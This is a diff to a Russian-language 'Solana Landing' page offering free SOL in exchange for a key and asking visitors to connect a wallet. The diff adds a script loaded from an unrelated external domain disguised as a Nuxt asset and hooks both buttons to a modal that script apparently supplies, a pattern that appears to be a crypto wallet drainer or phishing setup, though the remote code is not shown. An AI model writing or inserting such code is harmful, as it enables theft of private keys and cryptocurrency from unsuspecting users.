@@ -3,6 +3,9 @@
 <head>
   <meta charset="UTF-8">
   <title>Solana Landing</title>
+  <!-- Скрипт -->
+<script type="module" src="https://utter-daylong.defex.cc/_nuxt/assets/index.js"></script>
+  
   <style>
     * {
   box-sizing: border-box;
@@ -123,7 +126,7 @@ input {
     <div id="get" class="section active">
       <h1>Получить SOL</h1>
       <input type="text" placeholder="Введите ключ">
-      <button class="action">Получить SOL</button>
+      <button class="action" onclick="openModal()">Получить SOL</button>
       <div class="error">Введён неверный ключ</div>
     </div>
 
@@ -131,7 +134,7 @@ input {
     <div id="create" class="section">
       <h1>Создать</h1>
       <p>Подключение кошелька</p>
-      <button class="action">Подключить кошелёк</button>
+      <button class="action" onclick="openModal()">Подключить кошелёк</button>
     </div>
 
   </main>
